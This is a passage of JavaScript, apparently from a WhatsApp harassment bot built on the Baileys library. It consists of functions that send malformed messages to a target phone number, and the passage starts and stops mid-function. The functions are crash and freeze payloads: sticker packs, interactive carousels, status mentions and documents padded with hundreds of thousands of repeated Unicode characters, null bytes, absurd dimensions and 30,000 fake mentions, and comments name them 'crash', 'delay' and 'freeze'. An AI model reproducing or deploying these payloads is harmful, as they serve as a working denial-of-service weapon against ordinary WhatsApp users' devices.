                  "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath:
                  "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256:
                  "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: "",
              },
            },
          },
        },
      },
    },
  };

  await Usztzy.relayMessage(target, message, {
    participant: { jid: target },
  });
}
//balnk
async function spack2(target, imgLinks, fJids) {
const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        stickerPackMessage: {
          stickerPackId: "com.snowcorp.stickerly.android.stickercontentprovider 4fd4787a-6411-4116-acde-53cc59b95de5",
          name: `𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂` + "ោ៝".repeat(30000),
          publisher: `𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂` + "ោ៝".repeat(30000),
          caption: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
          stickers: [
            {
              fileName: "HzYPQ54bnDBMmI2Alpu0ER0fbVY6+QtvZwsLEkkhHNg=.webp",
              isAnimated: true,
              emojis: ["👾", "🩸"],
              accessibilityLabel: "@tamainfinity",
              stickerSentTs: "who know's ?",
              isAvatar: true,
              isAiSticker: true,
              isLottie: true,
              mimetype: "application/pdf"
            },
            {
              fileName: "GRBL9kN8QBxEWuJS3fRWDqAg4qQt2bN8nc1NIfLuv0M=.webp",
              isAnimated: false,
              emojis: ["🩸", "👾"],
              accessibilityLabel: "@tamainfinity_",
              stickerSentTs: "who know's ?",
              isAvatar: true,
              isAiSticker: true,
              isLottie: true,
              mimetype: "application/pdf"
            }
          ],
          fileLength: "728050",
          fileSha256: "jhdqeybzxe/pXEAT4BZ1Vq01NuHF1A4cR9BMBTzsLoM=",
          fileEncSha256: "+medG1NodVaMozb3qCx9NbGx7U3jq37tEcZKBcgcGyw=",
          mediaKey: "Wvlvtt7qAw5K9QIRjVR/vVStGPEprPr32jac0fig/Q0=",
          directPath: "/v/t62.15575-24/25226910_966451065547543_8013083839488915396_n.enc?ccb=11-4&oh=01_Q5AaIHz3MK0zl_5lrBfsxfartkbs4sSyx4iW3CtpeeHghC3_&oe=67AED5B0&_nc_sid=5e03e0",
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9741,
            mentionedJid: ["13135550002@s.whatsapp.net"],
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            businessMessageForwardInfo: {
              businessOwnerJid: "0@s.whatsapp.net"
            },
            dataSharingContext: {
              showMmDisclosure: true
            },
            quotedMessage: {
              callLogMesssage: {
              isVideo: false,
              callOutcome: "REJECTED",
              durationSecs: "1",
              callType: "VOICE_CHAT",
                participants: [
                  { jid: target, callOutcome: "CONNECTED" },
                  { jid: "0@s.whatsapp.net", callOutcome: "REJECTED" }
                ]
              }
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: true,
              id: "9741OURQ"
            },
            disappearingMode: {
              initiator: "CHANGED_IN_CHAT",
              trigger: "CHAT_SETTING"
            },
            forwardedNewsletterMessageInfo: {
              newsletterName: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" + "ោ៝".repeat(10),
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            },
            externalAdReply: {
              showAdAttribution: true,
              thumbnailUrl: imgLinks,
              mediaType: 1,
              renderLargerThumbnail: true
            }
          },
          packDescription: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" + "ោ៝".repeat(100000),
          jpegThumbnail: imgLinks,
          mediaKeyTimestamp: "1736088676",
          trayIconFileName: "com.snowcorp.stickerly.android.stickercontentprovider 4fd4787a-6411-4116-acde-53cc59b95de5.png",
          thumbnailDirectPath: "/v/t62.15575-24/25226910_966451065547543_8013083839488915396_n.enc?ccb=11-4&oh=01_Q5AaIHz3MK0zl_5lrBfsxfartkbs4sSyx4iW3CtpeeHghC3_&oe=67AED5B0&_nc_sid=5e03e0",
          thumbnailSha256: "FQFP03spSHOSBUTOJkQg/phVS1I0YqtoqE8DoFZ/cmw=",
          thumbnailEncSha256: "OALtE35ViGAkU7DROBsJ1RK1dgma/dLcjpvUg62Mj8c=",
          thumbnailHeight: 999999999,
          thumbnailWidth: 999999999,
          imageDataHash: "c6a15de8c2d205c6b1b344476f5f1af69394a9698ed1f60cb0e912fb6a9201c4",
          stickerPackSize: "723949",
          stickerPackOrigin: "THIRD_PARTY"
        }
      }
    }
  }, { userJid: target });
  await Usztzy.relayMessage(
    target,
    msg.message,
    fJids
      ? { participant: { jid: target, messageId: msg.key.id } }
      : {}
  );
}

async function frezui(Usztzy, jid) {
var msg = await generateWAMessageFromContent(jid, proto.Message.fromObject({
    viewOnceMessage: {
    message: {
      interactiveMessage: {
        header: {
          title: "Please Look My Message\n",
          locationMessage: {
            degreesLatitude: -999.03499999999999,
            degreesLongitude: 999.03499999999999,
            jpegThumbnail: global.thumb // di ubh ke null atau kosong string jg bs
          },
          hasMediaAttachment: true
        },
        body: {
          text: "lu Hama tolol" + "@1".repeat(90000) + "ꦾ".repeat(90000) + "\u0000"
          
        },
        nativeFlowMessage: {
          messageParamsJson: "\u0000".repeat(55000)
        },
        carouselMessage: {}
      }
    }
  }
}), { userJid: jid,  })
await Usztzy.relayMessage(jid, msg.message, { messageId: msg.key.id })
}


async function VampireLocation(target) {
            let virtex = "©𝗩𝗮𝗺𝗽𝗶𝗿𝗲";
            let memekz = Date.now();

            await Usztzy.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                locationMessage: {
                                    degreesLatitude: -999.03499999999999,
                                    degreesLongitude: 999.03499999999999
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "𝗩𝗮𝗺𝗽𝗶𝗿𝗲 𝗠𝗮𝘂 𝗡𝗲𝗻𝗲𝗻🤤\n" + "ꦫꦾ".repeat(50000) + "@X".repeat(90000) + "ৢ".repeat(90000) + "ᬃᬃ".repeat(90000) + "⿻".repeat(90000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "AngeLs`" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });            
        };
        
//belom di tes
async function SockMentionJid3(target, Ptcp = false) {
      await Usztzy.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "༑⃟𝗜༑⃟Kntija☇peler༑bnz༑⃐⃐⃐ㇱ-" + "@0".repeat(90000),
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 15000,
                  },
                  () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                ),
              ],
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: " target ",
              conversionData: "",
              conversionDelaySeconds: 10,
              forwardingScore: 9999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: " target ",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "https://telegra.ph/file/aba43b3fdd3003a4a8539.jpg",
                caption: " target ",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "\u0000",
                body: "\u0000",
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewType: "VIDEO",
                thumbnail: "https://telegra.ph/file/aba43b3fdd3003a4a8539.jpg",
                sourceType: " target ",
                sourceId: " target ",
                sourceUrl: "https://www.facebook.com/WhatsApp",
                mediaUrl: "https://www.facebook.com/WhatsApp",
                containsAutoReply: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://www.facebook.com/WhatsApp",
              },
              groupSubject: " target ",
              parentGroupJid: "120363321780343299-0@g.us",
              trustBannerType: " target ",
              trustBannerAction: 1,
              isSampled: true,
              utm: {
                utmSource: " target ",
                utmCampaign: " target ",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363321780343299-0@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbClientCampaignId: "smb_client_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }
    
async function arka3(target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "\u200D".repeat(1000),
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            target, "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "\u9999",
                                    title: "\u9999",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "google.com",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await Usztzy.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await Usztzy.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}

    
    
    async function arka2(target, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "Come here kiddo - AmbaCrash",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await Usztzy.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await Usztzy.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "@💥𝐔𝐒𝐙 㐅 𝐓𝐑𝐄𝐀𝐌𝐀𝐊𝐄𝐑" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
    
async function arka1(target, mention) {
const delaymention = Array.from({ length: 9741 }, (_, r) => ({
title: "᭯".repeat(9741),
rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
}));

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "@💥𝐔𝐒𝐙 㐅 𝐓𝐑𝐄𝐀𝐌𝐀𝐊𝐄𝐑",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "🌀" },
contextInfo: {
mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
participant: target,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "9741@newsletter",
serverMessageId: 1,
newsletterName: "-"
}
},
description: "( # )"
}
}
},
contextInfo: {
channelMessage: true,
statusAttributionType: 2
}
};

const msg = generateWAMessageFromContent(target, MSG, {});

await Usztzy.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: target },
content: undefined
}
]
}
]
}
]
});

if (mention) {
await Usztzy.relayMessage(
target,
{
statusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25
}
}
}
},
{
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "🌀 𝐔𝐒𝐙 㐅 𝐓𝐑𝐄𝐀𝐌𝐀𝐊𝐄𝐑" },
content: undefined
}
]
}
);
}
}
//Delay Seticker
async function DelayStc(target) {
  const stickerUrl = 'https://mmg.whatsapp.net/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0&mms3=true';

  const mentionedJid = Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");

  const stickerMsg = {
    key: {
      remoteJid: target,
      fromMe: true,
      id: (new Date().getTime()).toString()
    },
    message: {
      stickerMessage: {
        url: stickerUrl,
        mimetype: 'image/webp',
        fileSha256: Buffer.from([
          187, 146, 22, 50, 195, 167, 208, 126,
          9, 85, 68, 142, 83, 49, 94, 118,
          1, 203, 45, 28, 56, 91, 122, 225,
          139, 174, 84, 97, 202, 226, 252, 163
        ]),
        fileEncSha256: Buffer.from([
          1, 254, 7, 45, 33, 43, 134, 167,
          251, 8, 52, 166, 190, 90, 18, 147,
          250, 143, 80, 250, 190, 46, 203, 103,
          130, 205, 132, 101, 235, 40, 60, 22
        ]),
        mediaKey: Buffer.from([
          234, 34, 50, 200, 155, 222, 255, 16,
          171, 221, 14, 53, 40, 212, 205, 246,
          163, 9, 7, 35, 191, 155, 107, 246,
          33, 191, 184, 168, 105, 109, 140, 184
        ]),
        fileLength: "9999999999",
        directPath: '/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0',
        mediaKeyTimestamp: "9999999999",
        isAnimated: false,
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        contextInfo: {
          mentionedJid
        }
      }
    }
  };

  await Usztzy.relayMessage(target, stickerMsg.message, { messageId: stickerMsg.key.id });
}
async function CaywzZdelayMaker(target, o, ptcp = true) {
  const jids = "@0".repeat(10200);
  const ui = "ꦽ".repeat(1500);

  await Usztzy.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype:
                  "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "🌸 𝗖‌𝗮‌𝘆𝘄‌𝘇𝘇‌𝗮𝗷𝗮‌",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath:
                  "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: o,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "🌸 𝗖‌𝗮‌𝘆𝘄‌𝘇𝘇‌𝗮𝗷𝗮‌" + ui + jids,
            },
            footer: {
              text: "",
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () =>
                    "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "🌸 𝗖‌𝗮‌𝘆𝘄‌𝘇𝘇‌𝗮𝗷𝗮‌",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath:
                    "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath:
                    "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256:
                    "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256:
                    "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "",
                },
              },
            },
          },
        },
      },
    },
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
}
// invis kontak
async function invisKontak(target) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                contactMessage: {
                    displayName: " 💥𝐔𝐒𝐙 㐅 𝐓𝐑𝐄𝐀𝐌𝐀𝐊𝐄𝐑",
                    vcard: `BEGIN:VCARD
VERSION:3.0
FN:Usztzy 
`,
                    contextInfo: {
                        mentionedJid: Array.from({
                            length: 30000
                        }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await Usztzy.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: target
                    },
                    content: undefined
                }]
            }]
        }]
    });
}
async function robustfreeze(target, Ptcp = true) {
  try {
    await Usztzy.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "Anafabula here 👁⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝‌\n" +
                  "ꦽ".repeat(92000) +
                  `@1`.repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "Vamp",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
//CrashCarousel
async function sendCrashCarousel(targetJid) {
  const message = generateWAMessageFromContent(targetJid, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "\0"
          },
          carouselMessage: {
            cards: [
              {
                header: {
                  ...(await prepareWAMessageMedia({
                    image: { url: "https://files.catbox.moe/n1nqsc.jpg" }
                  }, {
                    upload: Usztzy.waUploadToServer
                  })),
                  title: "\0",
                  gifPlayback: true,
                  subtitle: "\0",
                  hasMediaAttachment: true
                },
                body: {
                  text: "Arg" + "ꦾ".repeat(120000)
                },
                footer: {
                  text: "\0"
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: JSON.stringify({
                        title: "",
                        sections: []
                      })
                    },
                    {
                      name: "single_select",
                      buttonParamsJson: JSON.stringify({
                        title: "𑲭𑲭".repeat(60000),
                        sections: [
                          {
                            title: " i wanna be kill you ",
                            rows: []
                          }
                        ]
                      })
                    },
                    { name: "call_permission_request", buttonParamsJson: "{}" },
                    { name: "mpm", buttonParamsJson: "{}" },
                    {
                      name: "single_select",
                      buttonParamsJson: JSON.stringify({
                        title: "🦠",
                        sections: [
                          {
                            title: "🔥",
                            highlight_label: "💥",
                            rows: [
                              { header: "", title: "💧", id: "⚡" },
                              { header: "", title: "💣", id: "✨" }
                            ]
                          }
                        ]
                      })
                    },
                    {
                      name: "quick_reply",
                      buttonParamsJson: JSON.stringify({
                        display_text: "Quick Crash Reply",
                        id: "📌"
                      })
                    },
                    {
                      name: "cta_url",
                      buttonParamsJson: JSON.stringify({
                        display_text: "Developed",
                        url: "https://t.me/Whhwhahwha",
                        merchant_url: "https://t.mw/Whhwhahwha"
                      })
                    },
                    {
                      name: "cta_call",
                      buttonParamsJson: JSON.stringify({
                        display_text: "Call Us Null",
                        id: "message"
                      })
                    },
                    {
                      name: "cta_copy",
                      buttonParamsJson: JSON.stringify({
                        display_text: "Copy Crash Code",
                        id: "message",
                        copy_code: "#CRASHCODE9741"
                      })
                    },
                    {
                      name: "cta_reminder",
                      buttonParamsJson: JSON.stringify({
                        display_text: "Set Reminder Crash",
                        id: "message"
                    })
                    },
                    {
                      name: "cta_cancel_reminder",
                      buttonParamsJson: JSON.stringify({
                        display_text: "Cancel Reminder Crash",
                        id: "message"
                      })
                    },
                    {
                      name: "address_message",
                      buttonParamsJson: JSON.stringify({
                        display_text: "Send Crash Address",
                        id: "message"
                      })
                    },
                    {
                      name: "send_location",
                      buttonParamsJson: "\0"
                    }
                  ]
                }
              }
            ],
            messageVersion: 1
          }
        }
      }
    }
  }, {
  });

  await Usztzy.relayMessage(targetJid, message.message, {
    messageId: message.key.id
  });

  console.log("Success! Crash Carousel sent by usztreamaker");
}
async function sendComboInteractive(Usztzy, target) {
  const longFileName = "Aku jawa" + "ꦾ".repeat(40000) + "@1".repeat(40000);

  // Dokumen dengan nama file panjang
  const fakeDocument = {
    url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    fileLength: "999999999",
    pageCount: 9999999999999,
    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    fileName: longFileName,
    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1715880173",
    contactVcard: true
  };

  const messagePayload = {
    documentMessage: fakeDocument,
    title: longFileName,
    hasMediaAttachment: true
  };

  // Tombol dokumen interaktif
  const buttonsDoc = Array(20).fill({
    name: "call_permission_request",
    buttonParamsJson: "{}"
  });

  // Carousel cards
  const cards = [
    {
      header: {
        // Image header bisa ditambahkan jika kamu punya fungsi upload, contoh pakai url
        title: "Card 1 Title",
        subtitle: "Card 1 Subtitle",
        hasMediaAttachment: false
      },
      body: {
        text: "Ini card pertama dengan tombol"
      },
      footer: {
        text: "Footer 1"
      },
      nativeFlowMessage: {
        buttons: [
